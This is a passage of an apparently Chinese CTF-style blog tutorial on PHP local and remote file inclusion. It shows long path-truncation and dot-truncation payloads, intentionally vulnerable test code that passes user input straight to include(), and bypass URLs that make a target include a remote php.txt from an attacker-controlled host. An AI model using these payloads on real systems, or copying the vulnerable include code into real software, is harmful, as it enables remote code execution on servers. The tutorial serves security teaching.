class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span><span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">//</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span><span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">//</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>./<br></code></pre></td></tr></table></figure>
+<p><font color =blue>点号截断</font><br>条件：windows OS，点号需要长于256</p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lasso">http:<span class="hljs-comment">//www.ctfs-wiki.com/FI/FI.php</span><br>?filename=test.txt<span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>..<br></code></pre></td></tr></table></figure>
+
+<h3 id="2、远程文件包含"><a href="#2、远程文件包含" class="headerlink" title="2、远程文件包含"></a>2、远程文件包含</font></h3><p>PHP的配置文件allow_url_fopen和allow_url_include设置为ON，<br>include&#x2F;require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">allow_url_fopen</span> = <span class="hljs-literal">On</span>(是否允许打开远程文件)<br><span class="hljs-attr">allow_url_include</span> =<span class="hljs-literal">On</span>(是否允许include/require远程文件)<br></code></pre></td></tr></table></figure>
+<p>1.无限制远程文件包含漏洞<br>测试代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$filename</span>  = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$filename</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>测试结果：<br>通过远程文件包含漏洞，包含php.txt可以解析。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.filename.com<span class="hljs-regexp">/RFI1.php?filename=http:/</span><span class="hljs-regexp">/192.168.204.128/</span>wenjian/php.txt<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210428085625413.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>2. 有限制远程文件包含漏洞绕过</p>
+<p> 测试代码：<br> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>] . <span class="hljs-string">&quot;.html&quot;</span>); <br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><br> 代码中多添加了html后缀，导致远程包含的文件也会多一个html后缀。<br><img src="https://img-blog.csdnimg.cn/20210428090021657.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><font color=blue>问号绕过</font></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.ctfs-wiki.com<span class="hljs-regexp">/FI/</span>WFI.php?filename=http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">91.133</span><span class="hljs-regexp">/FI/</span>php.txt?<br></code></pre></td></tr></table></figure>
+<p><font color=blue>#号绕过</font></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.ctfs-wiki.com<span class="hljs-regexp">/FI/</span>WFI.php?filename=http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">91.133</span><span class="hljs-regexp">/FI/</span>php.txt%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>
+<p><font color=blue>%00截断</font></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.filename.com<span class="hljs-regexp">/RFI2.php?filename=http:/</span><span class="hljs-regexp">/192.168.204.128/</span>wenjian/php.txt%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>
+<p><font color=blue>用burp跑一遍发现空格也可以绕过</font></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.ctfs-wiki.com<span class="hljs-regexp">/FI/</span>WFI.php?filename=http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">91.133</span><span class="hljs-regexp">/FI/</span>php.txt%<span class="hljs-number">20</span><br></code></pre></td></tr></table></figure>
+
+
+<p>参考博客：<a href="https://www.[添加链接描述](https://blog.csdn.net/qq_43625917/article/details/99865511?spm=1001.2014.3001.5501)freebuf.com/articles/web/182280.html">博客</a></p>
